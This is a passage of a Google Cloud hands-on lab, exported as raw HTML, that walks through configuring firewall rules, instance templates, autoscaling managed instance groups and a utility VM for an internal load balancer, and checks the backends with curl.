cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="https://cdn.qwiklabs.com/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h2 id='task-1-configure-http-and-health-check-firewall-rules-4'><span>Task 1. Configure HTTP and health check firewall rules</span></h2><p><span>Configure firewall rules to allow HTTP traffic to the backends and TCP traffic from the Google Cloud health checker.</span></p><h3 id='explore-the-my-internal-app-network'><span>Explore the my-internal-app network</span></h3><p><span>The network </span><code>my-internal-app</code><span> with subnet-a and subnet-b along with firewall rules for RDP, SSH, and ICMP traffic have been configured for you.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>VPC networks</span></strong><span>.</span></p></li><li><p><span>Scroll down and notice the </span><strong><span>my-internal-app</span></strong><span> network with its subnets: </span><strong><span>subnet-a</span></strong><span> and </span><strong><span>subnet-b</span></strong></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network. In addition, the </span><strong><span>my-internal-app</span></strong><span> network has been created for you, as part of your network diagram.</span></p><p><span>You will create the managed instance groups in </span><strong><span>subnet-a</span></strong><span> and </span><strong><span>subnet-b</span></strong><span>. Both subnets are in the </span><code>REGION</code><span> region because an Internal Load Balancer is a regional service. The managed instance groups will be in different zones, making your service immune to zonal failures.</span></p></li></ol><h3 id='create-the-http-firewall-rule-4'><strong><span>Create the HTTP firewall rule</span></strong></h3><p><span>Create a firewall rule to allow HTTP traffic to the backends from the Load Balancer and the internet (to install Apache on the backends).</span></p><ol start='' ><li><p><span>Still in </span><strong><span>VPC network</span></strong><span>, in the left pane click </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the </span><strong><span>app-allow-icmp</span></strong><span> and </span><strong><span>app-allow-ssh-rdp</span></strong><span> firewall rules.</span></p><p><span>These firewall rules have been created for you.</span></p></li><li><p><span>Click </span><strong><span>+ Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>app-allow-http</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>my-internal-app</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>lb-backend</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>10.10.0.0/16</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp, </span><em><span>type:</span></em><span> 80</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Make sure to include the </span><strong><span>/16</span></strong><span> in the </span><strong><span>Source IPv4 ranges</span></strong><span> to specify all networks.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='create-the-health-check-firewall-rules-4'><span>Create the health check firewall rules</span></h3><p><span>Health checks determine which instances of a Load Balancer can receive new connections. For Internal load balancing, the health check probes to your load balanced instances come from addresses in the ranges </span><code>130.211.0.0/22</code><span> and </span><code>35.191.0.0/16</code><span>. Your firewall rules must allow these connections.</span></p><ol start='' ><li><p><span>Still in the </span><strong><span>Firewall rules</span></strong><span> page, click </span><strong><span>+ Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>app-allow-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>my-internal-app</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>lb-backend</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>130.211.0.0/22 and 35.191.0.0/16</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Make sure to enter the two </span><strong><span>Source IPv4 ranges</span></strong><span> one-by-one and pressing SPACE in between them.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click Check my progress to verify the objective.</span></p><p><span>Configure HTTP and health check firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-configure-instance-templates-and-create-instance-groups-4'><span>Task 2. Configure instance templates and create instance groups</span></h2><p><span>A managed instance group uses an instance template to create a group of identical instances. Use these to create the backends of the Internal Load Balancer.</span></p><h3 id='configure-the-instance-templates-5'><span>Configure the instance templates</span></h3><p><span>An instance template is an API resource that you can use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties. Create an instance template for both subnets of the </span><strong><span>my-internal-app</span></strong><span> network.</span></p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>Instance templates</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create instance template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>instance-template-1</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Series</span></strong><span>, select </span><strong><span>E2</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Machine type</span></strong><span>, select </span><strong><span>Shared-core</span></strong><span> &gt; </span><strong><span>e2-micro</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Network tags</span></strong><span>, specify </span><strong><span>lb-backend</span></strong><span>.</span></p><p><strong><span>Note:</span></strong><span> The network tag </span><strong><span>lb-backend</span></strong><span> ensures that the </span><strong><span>HTTP</span></strong><span> and </span><strong><span>Health Check</span></strong><span> firewall rules apply to these instances.</span></p></li><li><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click the dropdown icon to edit.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>my-internal-app</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>subnet-a</span></td></tr><tr><td style='text-align:left;' ><span>External IPv4 Address</span></td><td style='text-align:left;' ><span>None</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Management</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Metadata</span></strong><span>, click </span><strong><span>Add item</span></strong><span> and specify the following:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Key 1</span></th><th style='text-align:left;' ><span>Value 1</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>startup-script-url</span></td><td style='text-align:left;' ><span>gs://cloud-training/gcpnet/ilb/startup.sh</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> The </span><strong><span>startup-script-url</span></strong><span> specifies a script that will be executed when instances are started. This script installs Apache and changes the welcome page to include the client IP and the name, region and zone of the VM instance. Feel free to explore </span><a href='https://storage.googleapis.com/cloud-training/gcpnet/ilb/startup.sh'><span>this script</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the instance template to be created.</span></p></li></ol><h3 id='configure-the-next-instance-template'><span>Configure the next instance template</span></h3><p><span>Create another instance template for </span><strong><span>subnet-b</span></strong><span> by copying </span><strong><span>instance-template-1</span></strong><span>:</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Instance templates</span></strong><span>, check the box next to </span><strong><span>instance-template-1</span></strong><span>, then click </span><strong><span>Copy</span></strong><span>. Make sure to update the name as </span><strong><span>instance-template-2</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced options</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Networking</span></strong><span> tab.</span></p></li><li><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click the dropdown icon to edit.</span></p></li><li><p><span>Select </span><strong><span>subnet-b</span></strong><span> as the </span><strong><span>Subnetwork</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span> and then click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='create-the-managed-instance-groups-4'><strong><span>Create the managed instance groups</span></strong></h3><p><span>Create a managed instance group in </span><strong><span>subnet-a</span></strong><span> and one </span><strong><span>subnet-b</span></strong><span>.</span></p><p><strong><span>Note:</span></strong><span> Identify one of the other zones in the same region as </span><strong><span>subnet-a</span></strong><span>. For example, if your zone of </span><strong><span>subnet-a</span></strong><span> is </span><code>us-west2-a</code><span>, you could select </span><code>us-west2-b</code><span> for </span><strong><span>subnet-b</span></strong><span>.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, in the left pane click </span><strong><span>Instance groups</span></strong><span>, and then click </span><strong><span>Create Instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>instance-group-1</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><span>instance-template-1</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Single-zone</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Maximum number of instances</span></td><td style='text-align:left;' ><span>5</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Autoscaling signals (click the dropdown icon to edit) &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Managed instance groups offer </span><strong><span>autoscaling</span></strong><span> capabilities that allow you to automatically add or remove instances from a managed instance group based on increases or decreases in load. Autoscaling helps your applications gracefully handle increases in traffic and reduces cost when the need for resources is lower. You just define the autoscaling policy and the autoscaler performs automatic scaling based on the measured load.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p><p><span>Repeat the same procedure for </span><strong><span>instance-group-2</span></strong><span> in the different zone of same region as </span><strong><span>subnet-a</span></strong><span>:</span></p></li><li><p><span>Click </span><strong><span>Create Instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>instance-group-2</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><span>instance-template-2</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Single-zone</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><span>Zone (Use the different zone in same region as subnet-a)</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Maximum number of instances</span></td><td style='text-align:left;' ><span>5</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Autoscaling signals (click the dropdown icon to edit) &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='verify-the-backends-5'><span>Verify the backends</span></h3><p><span>Verify that VM instances are being created in both subnets and create a utility VM to access the backends&#39; HTTP sites.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Notice two instances that start with </span><code>instance-group-1</code><span> and </span><code>instance-group-2</code><span>.</span></p><p><span>These instances are in separate zones and their internal IP addresses are part of the </span><strong><span>subnet-a</span></strong><span> and </span><strong><span>subnet-b</span></strong><span> CIDR blocks.</span></p></li><li><p><span>To create a new instance, click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>.</span></p><p><span>Select the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>utility-vm</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><span>Machine Type</span></td><td style='text-align:left;' ><code>e2-micro</code><span> (1 shared vCPU)</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click </span><strong><span>Toggle</span></strong><span> to Edit network interface.</span></p><p><span>Specify the following:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>my-internal-app</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>subnet-a</span></td></tr><tr><td style='text-align:left;' ><span>Primary internal IPv4 address</span></td><td style='text-align:left;' ><span>Ephemeral (Custom)</span></td></tr><tr><td style='text-align:left;' ><span>Custom ephemeral IP address</span></td><td style='text-align:left;' ><span>10.10.20.50</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span> and then click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click Check my progress to verify the objective.</span></p><p><span>Configure instance templates and create instance groups</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Note that the internal IP addresses for the backends are </span><code>10.10.20.2</code><span> and </span><code>10.10.30.2</code><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If these IP addresses are different, replace them in the two </span><strong><span>curl</span></strong><span> commands below.</span></p><ol start='' ><li><p><span>For </span><strong><span>utility-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>To verify the welcome page for </span><code>instance-group-1-xxxx</code><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.20.2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-1-1zn8&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: us-central1-a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>To verify the welcome page for </span><code>instance-group-2-xxxx</code><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-2-q5wp&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: us-central1-b</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>Which of these fields identify the location of the backend?</span></p><p>&nbsp;</p><p><span>Server Hostname</span></p><p>&nbsp;</p><p><span>Server Location</span></p><p>&nbsp;</p><p><span>Client IP</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> The </span><strong><span>curl</span></strong><span> commands demonstrate that each VM instance lists the Client IP and its own name and location. This will be useful when verifying that the Internal Load Balancer sends traffic to both backends.</span></p><ol start='' ><li><p><span>Close the SSH terminal to </span><strong><span>utility-vm</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background 